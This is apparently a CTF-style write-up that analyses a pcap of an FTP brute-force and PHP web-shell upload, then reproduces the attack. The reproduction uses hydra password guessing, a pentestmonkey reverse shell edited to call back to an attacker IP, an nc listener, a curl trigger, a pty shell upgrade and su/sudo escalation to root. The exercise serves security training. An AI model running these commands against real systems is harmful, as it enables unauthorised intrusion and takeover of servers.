First challenge: Analyzing a .pcap using Wireshark


In the first packets we see SYN and SYN,ACK, but not ACK to complete the connection, which is a telltale of stealth scanning.

Then we see the message: 220 Hello FTP world!
Tools like Nmap with the -sV flag (for service version detection) or banner grabbing tools like Netcat could trigger this.

FTP	78	Request: USER jenny
FTP	78	Request: PASS 12345
FTP	81	Request: PASS password
FTP	79	Request: PASS dragon

We get this info (just showed a few passwords as there are many more) and we can tell that someone is brute-forcing using jenny's username.


I followed the TCP stream of Login successful and:
331 Please specify the password.

PASS password123

230 Login successful.




The attacker uses the PWD command:
400	15.576739978	192.168.0.147	192.168.0.115	FTP	71	Request: PWD
And the current directory is: var/www/html





Following the TCP stream I found more info:
IST -la

150 Here comes the directory listing.
226 Directory send OK.

TYPE I

200 Switching to Binary mode.

PORT 192,168,0,147,196,163

200 PORT command successful. Consider using PASV.

STOR shell.php

150 Ok to send data.
226 Transfer complete.

SITE CHMOD 777 shell.php

200 SITE CHMOD command ok.

QUIT

221 Goodbye.





Then following the TCP stream from the FTP_DATA protocol we can find more info:
http://pentestmonkey.net/tools/php-reverse-shell (the backdoor downloaded from the hacker)


After that I selected a packet after executing the shell and followed the TCP stream and found some commands used by the hacker:
whoami
ls -la
python3 -c 'import pty; pty.spawn("/bin/bash")'
su jenny
sudo su
git clone https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
ls -la
make
    make[1]: Entering directory '/root/Reptile/userland'
    Makefile:10: ../.config: No such file or directory
    make[1]: *** No rule to make target '../.config'.  Stop.
    make[1]: Leaving directory '/root/Reptile/userland'
    Makefile:56: recipe for target 'userland_bin' failed
    make: *** [userland_bin] Error 2
root@wir3:~/Reptile# 






Second Challenge:

I used hydra to find jenny's password:
hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.60.59
[DATA] attacking ftp://10.10.60.59:21/
[21][ftp] host: 10.10.60.59   login: jenny   password: 987654321

i connected to the ftp server:
ftp jenny@10.10.60.59
Name (10.10.60.59:root): jenny
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

Then I used:
ftp> get shell.php

And i changed some vaules on the shell:
$ip = '10.10.188.88';  // CHANGE THIS
$port = 8000;       // CHANGE THIS

And I downloaded back to the web server:
ftp> put shell.php

Then I created a listener on the designated port on my attacker machine:
nc -lvnp 8000

And executed it:
curl http://10.10.60.59/shell.php


Listening on 0.0.0.0 8000
Connection received on 10.10.60.59 42058
Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 09:45:57 up 29 min,  0 users,  load average: 0.00, 0.00, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

Then I executed the script:
python3 -c 'import pty; pty.spawn("/bin/bash")'

  python3 -c — Runs Python code from the command line.
  import pty — Imports the pty module, which lets you work with pseudo-terminals.
  pty.spawn("/bin/bash") — Launches a fully interactive bash shell inside your current one, as if it were run from a real terminal.


Then I logged in as jenny:
su jenny
su jenny
Password: 987654321

Then:
sudo su

oot@wir3:~# ls
ls
Reptile
root@wir3:~# cd Re	
cd Reptile/
root@wir3:~/Reptile# ls
ls
configs   Kconfig  Makefile  README.md  userland
flag.txt  kernel   output    scripts
root@wir3:~/Reptile# cat flag	
cat flag.txt 














